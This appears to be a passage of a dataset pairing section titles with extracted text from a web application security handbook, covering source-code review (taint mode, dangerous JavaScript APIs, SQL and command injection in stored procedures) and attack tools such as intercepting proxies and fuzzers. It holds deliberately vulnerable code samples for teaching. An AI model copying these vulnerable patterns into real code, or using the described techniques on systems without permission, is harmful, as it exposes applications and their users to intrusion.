prevent user-supplied input from\nbeing passed to potentially dangerous functions. Perl programs can be exe-\ncuted in taint mode by passing the -Tflag to the Perl interpreter as follows:\n#!/usr/bin/perl -T\nWhen a program is running in taint mode, the interpreter tracks each item\nof input received from outside the program and treats it as tainted. If another\nvariable has its value assigned on the basis of a tainted item, then it too is\ntreated as tainted. For example:\n$path = “/home/pubs” # $path is not tainted\n$filename = param(“file”); # $filename is from request\nparameter and is tainted\n$full_path = $path.$filename; # $full_path now tainted\nTainted variables cannot be passed to a range of powerful commands,\nincluding eval, system, exec, and open. In order to use tainted data in sensitive"
  },
  {
    "input": "JavaScript",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 616\n616 Chapter 18 ■ Finding Vulnerabilities in Source Code\noperations, it is necessary to “clean” the data by performing a pattern-matching\noperation and extracting the matched substrings. For example:\n$full_path =~ m/^([a-zA-Z1-9]+)$/; # match alphanumeric submatch\nin $full_path\n$clean_full_path = $1; # set $clean_full_path to the first\nsubmatch\n# $clean_full_path is untainted\nWhile the taint mode mechanism is designed to help protect against many\nkinds of vulnerability, it is only effective if developers use appropriate regular\nexpressions when extracting clean data from tainted input. If an expression is\ntoo liberal, and extracts data that may cause problems in the context in which\nit will be used, then the taint mode protection will fail and the application will\nstill be vulnerable. In effect, the taint mode mechanism serves as a reminder to\nprogrammers of the need to perform suitable validation on all input before\nusing it in dangerous operations. It cannot guarantee that the input validation\nimplemented will be adequate.\nJavaScript\nClient-side JavaScript can of course be accessed without requiring any privi-\nleged access to the application, enabling you to perform a security-focused\ncode review in any situation. A key focus of this review is to identify any vul-\nnerabilities such as DOM-based XSS, which are introduced on the client com-\nponent and leave users vulnerable to attack (see Chapter 12). A further reason\nfor reviewing JavaScript is to understand what kinds of input validation are\nimplemented on the client, and also how dynamically-generated user inter-\nfaces are constructed.\nWhen reviewing JavaScript, you should be sure to include both .jsfiles and\nscripts embedded in HTML content.\nThe key APIs to focus on are those that read from DOM-based data and that\nwrite to or otherwise modify the current document, as listed in Table18-12.\nTable18-12: JavaScript APIs That Read from DOM-Based Data\ndocument.location These APIs can be used to access DOM data that\nmay be controllable via a crafted URL, and may\ndocument.URL\ntherefore represent an entry point for crafted data to\ndocument.URLUnencoded attack other application users.\ndocument.referrer\nwindow.location"
  },
  {
    "input": "Database Code Components",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 617\nChapter 18 ■ Finding Vulnerabilities in Source Code 617\nTable18-12 (continued)\ndocument.write() These APIs can be used to update the\ncontents of the document, and to\ndocument.writeln()\ndynamically execute JavaScript code. If\ndocument.body.innerHtml attacker-controllable data is passed to any\nof these APIs, then this may provided a\neval() means of executing arbitrary JavaScript\nwithin a victim’s browser.\nwindow.execScript()\nwindow.setInterval()\nwindow.setTimeout()\nDatabase Code Components\nWeb applications increasingly use databases for much more than passive data\nstorage. Today’s databases contain rich programming interfaces, enabling sub-\nstantial business logic to be implemented within the database tier itself. Devel-\nopers frequently use database code components such as stored procedures,\ntriggers, and user-defined functions to carry out key tasks. When you are\nreviewing the source code to a web application, you should therefore ensure\nthat all logic implemented within the database is included within the scope of\nthe review.\nProgramming errors in database code components can potentially result in\nany of the various security defects described in this chapter. In practice, how-\never, there are two main areas of vulnerability that you should look out for. First,\ndatabase components may themselves contain SQL injection flaws. Second, user\ninput may be passed to potentially dangerous functions in unsafe ways.\nSQL Injection\nIn Chapter 9, we described how prepared statements can be used as a safe\nalternative to dynamic SQL statements, in order to prevent SQL injection\nattacks. However, even if prepared statements are properly used throughout\nthe web application’s own code, SQL injection flaws may still exist if\ndatabase code components construct queries from user input in an unsafe\nmanner.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 618\n618 Chapter 18 ■ Finding Vulnerabilities in Source Code\nThe following is an example of a stored procedure that is vulnerable to SQL\ninjection in the @nameparameter:\nCREATE PROCEDURE show_current_orders\n(@name varchar(400) = NULL)\nAS\nDECLARE @sql nvarchar(4000)\nSELECT @sql = ‘SELECT id_num, searchstring FROM searchorders WHERE ‘ +\n‘searchstring = ‘’’ + @name + ‘’’’;\nEXEC (@sql)\nGO\nEven if the application passes the user-supplied name value to the stored\nprocedure in a safe manner, the procedure itself concatenates this directly into\na dynamic query, and so is vulnerable.\nDifferent database platforms use different methods for performing dynamic\nexecution of strings containing SQL statements. For example:\n■■ MS-SQL: EXEC\n■■ Oracle: EXECUTE IMMEDIATE\n■■ Sybase: EXEC\n■■ DB2: EXEC SQL\nAny appearance of these expressions within database code components\nshould be closely reviewed. If user input is being used to construct the SQL\nstring, then the application may be vulnerable to SQL injection.\nNOTE On Oracle, stored procedures by default run with the permissions of\nthe definer, rather than the invoker (as with SUID programs on Unix). Hence, if\nthe application uses a low-privileged account to access the database, and\nstored procedures were created using a DBA account, then a SQL injection flaw\nwithin a procedure may enable you to escalate privileges, as well as to perform\narbitrary database queries.\nCalls to Dangerous Functions\nCustomized code components such as stored procedures are often used to per-\nform unusual or powerful actions. If user-supplied data is passed to a poten-\ntially dangerous function in an unsafe way, then this may lead to various kinds\nof vulnerabilities, depending on the nature of the function. For example, the"
  },
  {
    "input": "Tools for Code Browsing",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 619\nChapter 18 ■ Finding Vulnerabilities in Source Code 619\nfollowing stored procedure is vulnerable to command injection in the\n@loadfileand @loaddirparameters:\nCreate import_data (@loadfile varchar(25), @loaddir varchar(25) )\nas\nbegin\nselect @cmdstring = “$PATH/firstload “ + @loadfile + “ “ + @loaddir\nexec @ret = xp_cmdshell @cmdstring\n...\n...\nEnd\nThe following functions may be potentially dangerous if invoked in an\nunsafe way:\n■■ Powerful default stored procedures in MS-SQL and Sybase, which\nallow execution of commands, registry access, and so on.\n■■ Functions that provide access to the file system.\n■■ User-defined functions that link to libraries outside the database.\n■■ Functions that result in network access; for example, through\nOpenRowSetin MS-SQL or a database link in Oracle.\nTools for Code Browsing\nThe methodology we have described for performing a code review essentially\ninvolves reading the source code and searching for patterns indicating the cap-\nture of user input and the use of potentially dangerous APIs. To carry out a\ncode review effectively, it is preferable to use an intelligent tool for browsing\nthe code base—that is, one that understands the code constructs in a particu-\nlar language, provides contextual information about specific APIs and expres-\nsions, and facilitates your navigation.\nIn many languages, you can use one of the available development studios,\nsuch as Visual Studio, NetBeans, or Eclipse. There are also various generic\ncode-browsing tools, which support numerous languages and are optimized\nfor viewing of code rather than development. The authors’ preferred tool is\nSource Insight, illustrated in Figure 18-1. It supports easy browsing of the\nsource tree, a versatile search function, a preview pane to display contextual\ninformation about any selected expression, and speedy navigation through the\ncode base."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 620\n620 Chapter 18 ■ Finding Vulnerabilities in Source Code\nFigure18-1: Source Insight being used to search and browse the source code for a web\napplication\nChapter Summary\nMany people who have substantial experience of testing web applications\ninteractively display an irrational fear of looking inside an application’s code\nbase to discover vulnerabilities directly. This fear is understandable for people\nwho are not programmers themselves, but it is actually rarely justified. Any-\none who is familiar with dealing with computers can, with a little investment,\ngain sufficient knowledge and confidence to perform an effective code audit.\nYour objective in reviewing an application’s code base need not be to discover\n“all” of the vulnerabilities that it contains, any more than you would set your-\nself this unrealistic goal when performing hands-on testing. More reasonably,\nyou can aspire to understand some of the key processing that the application\nis performing on user-supplied input, and recognize some of the signatures\nthat point towards potential problems. Approached in this way, code review\ncan be an extremely useful complement to the more familiar black-box testing,\nby improving the effectiveness of that testing and by revealing defects which\nmay be extremely difficult to discover when you are dealing with an applica-\ntion entirely from the outside."
  },
  {
    "input": "Questions",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 621\nChapter 18 ■ Finding Vulnerabilities in Source Code 621\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. List three categories of common vulnerability that often have easily rec-\nognizable signatures within source code.\n2. Why can identifying all sources of user input sometimes be challenging\nwhen reviewing a PHP application?\n3. Consider the following two methods of performing a SQL query that\nincorporates user-supplied input:\n// method 1\nString artist = request.getParameter(“artist”).replaceAll(“‘“, “‘’”);\nString genre = request.getParameter(“genre”).replaceAll(“‘“, “‘’”);\nString album = request.getParameter(“album”).replaceAll(“‘“, “‘’”);\nStatement s = connection.createStatement();\ns.executeQuery(“SELECT * FROM music WHERE artist = ‘“ + artist +\n“‘ AND genre = ‘“ + genre + “‘ AND album = ‘“ + album + “‘“);\n// method 2\nString artist = request.getParameter(“artist”);\nString genre = request.getParameter(“genre”);\nString album = request.getParameter(“album”);\nStatement s = connection.prepareStatement(\n“SELECT * FROM music WHERE artist = ‘“ + artist +\n“‘ AND genre = ? AND album = ?”);\ns.setString(1, genre);\ns.setString(2, album);\ns.executeQuery();\nWhich of these methods is more secure, and why?\n4. You are reviewing the code base of a Java application, and during initial\nreconnaissance you search for all uses of the HttpServletRequest\n.getParameterAPI. The following code catches your eye:\nprivate void setWelcomeMessage(HttpServletRequest request) throws\nServletException\n{\nString name = request.getParameter(“name”);\nif (name == null)\nname = ““;\nm_welcomeMessage = “Welcome “ + name + “!”;\n}\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 622\n622 Chapter 18 ■ Finding Vulnerabilities in Source Code\nWhat possible vulnerability might this code point towards? What fur-\nther code analysis would you need to perform to confirm whether the\napplication is indeed vulnerable?\n5. You are reviewing the mechanism that an application uses for generat-\ning session tokens. The relevant code is as follows:\npublic class TokenGenerator\n{\nprivate java.util.Random r = new java.util.Random();\npublic synchronized long nextToken()\n{\nlong l = r.nextInt();\nlong m = r.nextInt();\nreturn l + (m << 32);\n}\n}\nAre the application’s session tokens being generated in a predictable way?\nExplain your answer fully."
  },
  {
    "input": "Chapter 19: A Web Application Hacker’s Toolkit",
    "output": "70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 623\nCHAPTER\n19\nA Web Application\nHacker’s Toolkit\nSome attacks on web applications can be performed using only a standard\nweb browser; however, the majority of them require you to use some addi-\ntional tools. Many of these tools operate in conjunction with the browser,\neither as extensions that modify the browser’s own functionality, or as external\ntools that run alongside the browser and modify its interaction with the target\napplication.\nThe most important item in your toolkit falls into this latter category, and\noperates as an intercepting web proxy, enabling you to view and modify all of\nthe HTTP messages passing between your browser and the target application.\nIn recent years, basic intercepting proxies have evolved into powerful inte-\ngrated tool suites containing numerous other functions designed to help you\nattack web applications. We will examine the three most popular integrated\nsuites and describe how you can best make use of their functionality.\nThe second main category of tool is the web application scanner. This is a\nproduct designed to automate many of the tasks involved in attacking a web\napplication, from initial mapping through to probing for vulnerabilities. We\nwill examine the inherent strengths and weaknesses of web application scan-\nners, and briefly look at the two current market leaders in this area.\n623"
  },
  {
    "input": "Web Browsers",
    "output": "70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 624\n624 Chapter 19 ■ A Web Application Hacker’s Toolkit\nWeb Browsers\nA web browser is not exactly a hack tool, being the standard means by which\nweb applications are designed to be accessed. Nevertheless, your choice\nof web browser may have an impact on your effectiveness when attacking a\nweb application. Further, there are various extensions available to different\ntypes of browsers, which can assist you in carrying out an attack. In this sec-\ntion, we briefly examine three popular browsers and some of the extensions\navailable to them.\nInternet Explorer\nMicrosoft’s Internet Explorer (IE) is currently the most widely used web\nbrowser, comprising approximately 60% of the market at the time of writing.\nVirtually all web applications are designed for and tested on IE, making it a\ngood choice for an attacker because most applications’ content and functional-\nity will be correctly displayed and usable within IE. In particular, other\nbrowsers do not natively support ActiveX controls, making IE mandatory if an\napplication employs this technology. One restriction imposed by IE is that,\nunlike using the other browsers, you are restricted to working with the\nMicrosoft Windows platform.\nBecause of IE’s widespread adoption, when you are testing for cross-site\nscripting and other attacks against application users, you should always try to\nmake your attacks work against this browser (see Chapter 12).\nVarious useful extensions are available to IE that may be of assistance when\nattacking web applications, including the following:\n■■ HttpWatch analyzes all HTTP requests and responses, providing details\nof headers, cookies, URLs, request parameters, HTTP status codes, and\nredirects (illustrated in Figure19-1).\n■■ IEWatch performs very similar functions to HttpWatch, and also pro-\nvides some analysis of HTML documents, images, scripts, and the like.\n■■ TamperIE allows viewing and modification of HTTP requests and\nresponses within the browser.\nFirefox\nFirefox is currently the second most widely used web browser, comprising\napproximately 35% of the market at the time of writing. The majority of web\napplications work correctly on Firefox; however, there is no native support for\nActiveX controls.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 625\nChapter 19 ■ A Web Application Hacker’s Toolkit 625\nFigure19-1: HttpWatch provides analysis of the HTTP requests issued by Internet\nExplorer.\nThere are many subtle variations among different browsers’ handling of\nHTML, particularly when this does not strictly comply to the standards. Often,\nyou will find that an application’s defenses against cross-site scripting mean\nthat your attacks are not effective against every browser platform. Firefox’s\npopularity is easily sufficient to make this is a feasible target for XSS attacks, so\nyou should test these against Firefox if you encounter difficulties getting them\nto work against IE.\nA large number of browser extensions are available for Firefox that may be\nuseful when attacking web applications, including the following:\n■■ FoxyProxy enables flexible management of the browser’s proxy config-\nuration, allowing quick switching, setting of different proxies for differ-\nent URLs, and so on.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 626\n626 Chapter 19 ■ A Web Application Hacker’s Toolkit\n■■ Tamper Data allows viewing and modification of HTTP requests and\nresponses within the browser.\n■■ LiveHTTPHeaders also allows modification of requests and responses,\nand replaying of individual requests.\n■■ AddNEditCookies enables the addition and modification of cookies’\nvalues and attributes (see Figure19-2).\n■■ CookieWatcher enables a cookie’s value to be monitored in a status bar.\nFigure19-2: AddNEditCookies allows direct modification\nof cookie values and attributes from within Firefox.\nOpera\nOpera is a relatively little-used browser, having less than 2% of the market\nshare at the time of this writing. Relatively few applications are specifically\ntested on Opera. Nevertheless, it provides a number of features that may be\nuseful when attacking web applications. The interface is highly customizable,\ngiving easy access to some of the more obscure features that attackers are often\ninterested in. Here are some useful Opera functions:\n■■ F12+x enables or disables the proxy.\n■■ ALT+CTRL+L displays all the links in the document.\n■■ CTRL+F3 displays the syntax-highlighted source of the current page.\n■■ ALT+T+A+C displays cookies, and allows them to be edited."
  },
  {
    "input": "Integrated Testing Suites",
    "output": "70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 627\nChapter 19 ■ A Web Application Hacker’s Toolkit 627\n■■ ALT+T+D deletes all private data, which can be useful for cleaning up\ncaches and cookies to create a fresh start within the application.\n■■ The Wand feature allows usernames and passwords to be remembered\nand automatically filled in on future visits.\nTIP You can often leverage features of your browser to assist you in attacking\na web application:\n■■ Provided that an application does not use persistent cookies to store\nsession tokens, you can use multiple processes of the same browser,\neach having a different session on the application. For example, when\ntesting access controls, you can use one browser instance logged in as\na high-privileged user and another logged in as a low-privileged user,\nand so quickly test the application’s handling of requests with different\nprivileges. If an application uses persistent cookies that affect its\nsessions, you can use two different browser products or a virtual\nmachine to perform this test.\n■■ You can clear the data that a browser has accumulated about an\napplication (principally, within its cookies and cache), in order to start\nafresh with the application as a new user.\n■■ You can right-click a link and open it in a new window or tab to\nexplore a specific avenue of functionality that catches your attention,\nwhile retaining your previous position to resume working\nsystematically through the application.\nIntegrated Testing Suites\nAfter the essential web browser, the most useful item in your toolkit when\nattacking a web application is an intercepting proxy. In the early days of web\napplications, the intercepting proxy was a standalone tool that provided the\nbarest of possible functionality—notably the venerable Achilles proxy, which\nsimply displayed each request and response for editing. Though extremely\nbasic, buggy, and a headache to use, Achilles was sufficient to compromise\nmany a web application in the hands of a skilled attacker.\nIn the last few years, the humble intercepting proxy has evolved into a num-\nber of highly functional tool suites, each containing several interconnected\ntools designed to carry out all of the common tasks involved in attacking a\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 628\n628 Chapter 19 ■ A Web Application Hacker’s Toolkit\nweb application. There are three leading suites in widespread use, which we\nwill examine in this section:\n■■ Burp suite\n■■ Paros\n■■ WebScarab\nHow the Tools Work\nEach integrated testing suite contains several complementary tools that share\ninformation about the target application. Typically, the attacker engages with\nthe application in the normal way via his browser, and the tools monitor the\nresulting requests and responses, storing all relevant details about the target\napplication and providing numerous useful functions. Each suite comprises\nthe following core components:\n■■ An intercepting proxy\n■■ A web application spider\n■■ An application fuzzer or scanner\n■■ A manual request tool\n■■ Various shared functions and utilities\nIntercepting Proxies\nThe intercepting proxy lies at the heart of the tool suite and remains today the\nonly really essential component. To make use of an intercepting proxy, you\nmust configure your browser to use as its proxy server a port on the local\nmachine. The proxy tool is configured to listen on this port and receives all\nrequests issued by the browser. Because the proxy has access to the two-way\ncommunications between the browser and the destination web server, it can\nstall each message for review and modification by the user, and perform other\nuseful functions.\nConfiguring Your Browser\nIf you have never set up your browser to use a proxy server, this is trivial to do\non any browser. First, establish which local port your intercepting proxy uses\nby default to listen for connections (usually 8080). Then perform the steps\nrequired for your browser:\n■■ In Internet Explorer, go to Tools➪ Internet Options➪ Connections➪\nLAN settings. Ensure that the Automatically Detect Settings and Use\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 629\nChapter 19 ■ A Web Application Hacker’s Toolkit 629\nAutomatic Configuration Script boxes are not checked. Ensure that the\nUse a Proxy Server for Your LAN box is checked. In the Address field,\nenter localhostand in the Port field enter the port used by your proxy.\nClick on the Advanced button, and ensure that the Use the Same Proxy\nServer for All Protocols box is checked. If the hostname of the application\nyou are attacking is matched by any of the expressions in the Do Not Use\nProxy Server for Addresses Beginning With box, remove these expres-\nsions. Click OK on all the dialogs to confirm the new configuration.\n■■ In Firefox, go to Tools➪ Options➪ Connection Settings. Ensure that\nthe Manual Proxy Configuration option is selected. In the HTTP Proxy\nfield, enter localhost, and in the adjacent Port field, enter the port used\nby your proxy. Ensure that the Use this Proxy Server for All Protocols\nbox is checked. If the hostname of the application you are attacking is\nmatched by any of the expressions in the No Proxy For box, remove\nthese expressions. Click OK on all the dialogs to confirm the new con-\nfiguration.\n■■ In Opera, go to Tools➪ Preferences➪ Advanced➪ Network➪ Proxy\nServers. Ensure that the Use Automatic Proxy Configuration box is\nempty. Ensure that the HTTP and HTTPS boxes are checked. In the\naddress fields, enter localhost, and in the port fields, enter the port\nused by your proxy. If the hostname of the application you are attack-\ning is matched by any of the expressions in the Do Not Use Proxy on\nthe Addresses Below box, remove these expressions. Click OK on all the\ndialogs to confirm the new configuration.\nIntercepting Proxies and HTTPS\nWhen dealing with unencrypted HTTP communications, an intercepting\nproxy functions in essentially the same way as a normal web proxy, as\ndescribed in Chapter 3. The browser sends standard HTTP requests to the\nproxy, with the exception that the URL in the first line of the request contains\nthe full hostname of the destination web server. The proxy parses out this host-\nname, resolves it to an IP address, converts the request to its standard non-\nproxy equivalent, and forwards it to the destination server. When that server\nresponds, the proxy forwards the response back to the client browser.\nFor HTTPS communications, the browser first makes a clear-text request to\nthe proxy using the CONNECTmethod, specifying the hostname and port of the\ndestination server. When a normal (non-intercepting) proxy is used, the proxy\nwould then respond with an HTTP 200 status code, keep the TCP connection\nopen, and from that point onwards (for that connection) act as a TCP-level relay\nto the destination server. The browser then performs an SSL handshake with\nthe destination server, setting up a secure tunnel through which to pass HTTP\nmessages. With an intercepting proxy, this process must work differently in\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 630\n630 Chapter 19 ■ A Web Application Hacker’s Toolkit\norder for the proxy to gain access to the HTTP messages that the browser sends\nthrough the tunnel. As illustrated in Figure 19-3, after responding to the CON-\nNECTrequest with an HTTP 200 status code, the intercepting proxy does not act\nas a relay but instead itself performs the server’s end of the SSL handshake with\nthe browser. It also acts as an SSL client and performs a second SSL handshake\nwith the destination web server. Hence, two SSL tunnels are created, with the\nproxy acting as a man-in-the-middle between them. This enables the proxy to\ndecrypt each message received through either tunnel, gain access to its clear-\ntext form, and then reencrypt it for transmission through the other tunnel.\nAttacker Internet Target\nCONNECT wahh-app:433\n200 Connection established\nIntercepting proxy\nSSL tunnel 1 SSL tunnel 2\nGET / HTTP/1.1\n1101001000100 User-Agent: Mozilla/ 11001001101000\n11010100000 4.0 (compatible; MSIE 10001001001…\n7.0; Windows NT 5.1)\nHost: wahh-app.com\n…\nHTTP/1.1 200 OK\n1100100110010 0010010100001\nContent-Type: text/\n01010101110 01111010100…\nhtml\nContent-Length:\n24246\n<html><head> …\nFigure19-3: An intercepting proxy allows HTTPS communications to be viewed and\nmodified.\nOf course, if any suitably positioned attacker could perform this trick with-\nout detection, then SSL would be fairly pointless because it would not protect\nthe privacy and integrity of communications between the browser and server.\nFor this reason, a key part of the SSL handshake involves the use of crypto-\ngraphic certificates to authenticate the identity of either party. To perform the\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 631\nChapter 19 ■ A Web Application Hacker’s Toolkit 631\nserver’s end of the SSL handshake with the browser, the intercepting proxy\nmust use its own SSL certificate, because it does not have access to the private\nkey used by the destination server. In this situation, to protect against attacks,\nbrowsers present the user with a warning, allowing them to view the spurious\ncertificate and decide whether to trust it. Figure 19-4 shows the warning pre-\nsented by Firefox. When an intercepting proxy is being used, of course, both\nthe browser and proxy are fully under the control of the attacker, so they can\naccept the spurious certificate and allow the proxy to create two SSL tunnels.\nFigure19-4: Using an intercepting proxy with HTTPS communications\ngenerates a warning within the attacker’s browser.\nCommon Features\nIn addition to their core function of allowing interception and modification of\nrequests and responses, the proxies in the three main tool suites contain a\nwealth of other features to assist you in attacking web applications. These\ninclude the following:\n■■ Fine-grained interception rules, allowing messages to be intercepted for\nreview or silently forwarded, based on criteria such as the target host,\nURL, method, resource type, response code, or appearance of specific\nexpressions (see Figure19-5). In a typical application, the vast majority\nof requests and responses are of little interest to you, and this function\nallows you to configure the proxy to flag only the messages that you are\ninterested in.\n■■ A detailed history and cache of all requests and responses, allowing\nprevious messages to be reviewed, and passed to other tools in the suite\nfor further analysis.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 632\n632 Chapter 19 ■ A Web Application Hacker’s Toolkit\n■■ Automated match-and-replace rules for dynamically modifying the\ncontents of requests and responses. This function can be useful in\nnumerous situations—for example, to rewrite the value of a cookie or\nother parameter in all requests, to remove cache directives, to simulate\na specific browser with the User-Agentheader, and so on.\n■■ Access to proxy functionality directly from within the browser, in addi-\ntion to the client UI. This enables you to browse the cache of requests\nand responses, and reissue individual requests from the context of your\nbrowser, enabling the responses to be fully processed and interpreted in\nthe normal way (see Figure19-6).\n■■ Utilities for manipulating the format of HTTP messages, such as con-\nverting between different request methods and content encodings.\nThese can sometimes be useful when fine-tuning an attack such as\ncross-site scripting.\n■■ A function to reveal any hidden form fields in application responses so\nthat these are visible within the browser.\nFigure19-5: Burp proxy supports configuration of fine-grained rules\nfor intercepting requests and responses.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 633\nChapter 19 ■ A Web Application Hacker’s Toolkit 633\nFigure19-6: In-browser access to the proxy cache\nWeb Application Spiders\nWeb application spiders work in a similar way to traditional web spiders—by\nrequesting web pages, parsing these for links to other pages, and then request-\ning those pages, continuing recursively until all of a site’s content has been dis-\ncovered. To accommodate the differences between functional web applications\nand traditional web sites, application spiders must go beyond this core func-\ntion and address various other challenges, such as the following:\n■■ Forms-based navigation, using drop-down lists, text input, and other\nmethods.\n■■ JavaScript-based navigation, such as dynamically generated menus.\n■■ Multistage functions requiring actions to be performed in a defined\nsequence.\n■■ Authentication and sessions.\n■■ The use of parameter-based identifiers, rather than the URL, to specify\ndifferent content and functionality.\n■■ The appearance of tokens and other volatile parameters within the URL\nquery string, leading to problems identifying unique content.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 634\n634 Chapter 19 ■ A Web Application Hacker’s Toolkit\nSeveral of these problems are addressed in integrated testing suites by shar-\ning data between the intercepting proxy and spider components. This enables\nyou to use the target application in the normal way, with all requests being\nprocessed by the proxy and passed to the spider for further analysis. Any\nunusual mechanisms for navigation, authentication, and session handling are\nthereby taken care of by your browser and your actions, enabling the spider to\nbuild up a detailed picture of the application’s contents under your fine-\ngrained control. This user-directed spidering technique is described in detail\nin Chapter 4. Having assembled as much information as possible, the spider\ncan then be launched to investigate further under its own steam, potentially\ndiscovering additional content and functionality.\nThe following features arecommonly implemented within web application\nspiders:\n■■ Automatic update of the site map with URLs accessed via the intercept-\ning proxy.\n■■ Passive spidering of content processed by the proxy, by parsing it for\nlinks and adding these to the site map without actually requesting them\n(see Figure19-7).\n■■ Presentation of discovered content in table and tree form, with the facil-\nity to search these results.\n■■ Fine-grained control over the scope of automated spidering. This\nenables you to specify which hostnames, IP addresses, directory paths,\nfile types, and other items should be requested by the spider, to focus\non a particular area of functionality and prevent the spider from follow-\ning inappropriate links either within or outside of the target applica-\ntion’s infrastructure. This feature is also essential to avoid spidering\npowerful functionality such as administrative interfaces, which may\ncause dangerous side effects such as the deletion of user accounts. It is\nalso useful to prevent the spider from requesting the logout function,\nthereby invalidating its own session.\n■■ Automatic parsing of HTML forms, scripts, comments, and images, and\nanalysis of these within the site map.\n■■ Parsing of JavaScript content for URLs and resource names. Even if a\nfull JavaScript engine is not implemented, this function often enables a\nspider to discover the targets of JavaScript-based navigation because\nthese usually appear in literal form within the script.\n■■ Automatic and user-guided submission of forms with suitable parame-\nters (see Figure19-8).\n■■ Detection of customized File Not Found responses. Many applications\nrespond with an HTTP 200 message when an invalid resource is\nrequested. If spiders are unable to recognize this, the resulting content\nmap will contain false positives.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 635\nChapter 19 ■ A Web Application Hacker’s Toolkit 635\n■■ Checking for the robots.txtfile, which is intended to provide a black-\nlist of URLs that should not be spidered, but which an attacking spider\ncan use to discover additional content.\n■■ Automatic retrieval of the root of all enumerated directories. This can be\nuseful to check for directory listings or default content (see Chapter 17).\n■■ Automatic processing and use of cookies issued by the application, to\nenable spidering to be performed in the context of an authenticated\nsession.\n■■ Automatic testing of session-dependence of individual pages. This\ninvolves requesting each page both with and without any cookies that\nhave been received. If the same content is retrieved, then the page does\nnot require a session or authentication. This can be useful when probing\nfor some kinds of access control flaw (see Chapter 8).\n■■ Automatic use of the correct Refererheader when issuing requests. Some\napplications may check the contents of this header, and this function\nensures that the spider behaves as far as possible like an ordinary browser.\n■■ Control of other HTTP headers used in automated spidering.\n■■ Control over the speed and order of automated spider requests, to avoid\noverwhelming the target, and if necessary behave in a stealthy manner.\nFigure19-7: WebScarab showing the results from passive application spidering\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 636\n636 Chapter 19 ■ A Web Application Hacker’s Toolkit\nFigure19-8: Burp Spider prompting for user guidance when submitting forms\nApplication Fuzzers and Scanners\nWhile it is possible to perform a successful attack using only manual tech-\nniques, to become a truly accomplished web application hacker, you need to\nmake use of automation in your attacks, to enhance their speed and effective-\nness. In Chapter 13, we described in detail the different ways in which automa-\ntion can be used, and each of the integrated test suites includes functions that\nleverage automation to facilitate various common tasks. The following fea-\ntures are implemented in the different tool suites:\n■■ Automated scans to detect common vulnerabilities. None of the\nintegrated test suites performs the kind of advanced application scans\ncarried out by dedicated vulnerability scanners (described later in\nthis chapter). However, they can be used to send a set of attack strings\nas each parameter in a given request and analyze the application’s\nresponses to identify signatures of common vulnerabilities. Figure19-9\nshows the results of a scan performed by Paros.\n■■ Manually configured scanning for common vulnerabilities. This\nfunction enables you to control precisely which attack strings are\nused and how they are incorporated into requests, and review the\nresults to identify any unusual or anomalous responses that merit fur-\nther investigation.\n■■ A set of built-in attack payloads and versatile functions to generate\narbitrary payloads in user-defined ways—for example, based on mal-\nformed encoding, character substitution, brute force, data retrieved in a\nprevious attack, and so on.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 637\nChapter 19 ■ A Web Application Hacker’s Toolkit 637\n■■ Ability to save scan response data to use in reports or incorporate into\nfurther attacks.\n■■ Customizable functions for viewing and analyzing responses—for\nexample, based on the appearance of specific expressions or the attack\npayload itself.\n■■ Functions for extracting useful data from the application’s responses—\nfor example, by parsing out the username and password fields in a My\nDetails page. This can be useful when you are exploiting various vul-\nnerabilities, including flaws in session-handling and access controls.\n■■ Functions for analyzing cookies and other tokens for any sequences.\nFigure19-9: The results of a scan performed by Paros\nManual Request Tools\nThe manual request component of the integrated test suites provides the basic\nfacility to issue a single request and view its response. Though simple, this\nfunction is often extremely beneficial when you are probing a tentative vul-\nnerability and need to reissue the same request manually several times, tweak-\ning elements of the request to determine the effect on the application’s\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 638\n638 Chapter 19 ■ A Web Application Hacker’s Toolkit\nbehavior. Of course, you could perform this task using a standalone tool such\nas netcat, but having the function built in to the suite means that you can\nquickly retrieve an interesting request from another component (proxy, spider,\nor fuzzer) for manual investigation. It also means that the manual request tool\nbenefits from the various shared functions implemented within the suite, such\nas HTML rendering, support for downstream proxies and authentication, and\nautomatic updating of the Content-Length header. See Figure 19-10 for an\nexample of a request being manually reissued.\nThe following features areimplemented within the different manual request\ntools:\n■■ Integration with other suite components, and the ability to refer any\nrequest to and from other components for further investigation.\n■■ History of all requests and responses, keeping a full record of all man-\nual requests for further review, and enabling a previously modified\nrequest to be retrieved for further analysis.\nFigure19-10: A request being manually reissued using Burp Repeater\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 639\nChapter 19 ■ A Web Application Hacker’s Toolkit 639\nShared Functions and Utilities\nIn addition to their core tool components, the integrated test suites provide a\nwealth of other value-added features that address specific needs that arise\nwhen you are attacking a web application, and that enable the other tools to\nwork in unusual situations. The following features are implemented by the\ndifferent suites:\n■■ Analysis of HTTP message structure, including parsing of headers and\nrequest parameters (see Figure19-11).\n■■ Rendering of HTML content in responses as it would appear within the\nbrowser.\n■■ Ability to display and edit messages in text and hexadecimal form.\n■■ Search functions within all requests and responses.\n■■ Automatic updating of the HTTP Content-Lengthheader following\nany manual editing of message contents.\n■■ Built-in encoders and decoders for various schemes, enabling quick\nanalysis of application data in cookies and other parameters.\n■■ A function to compare two responses and highlight the differences.\n■■ Ability to save the current testing session to disk and retrieve 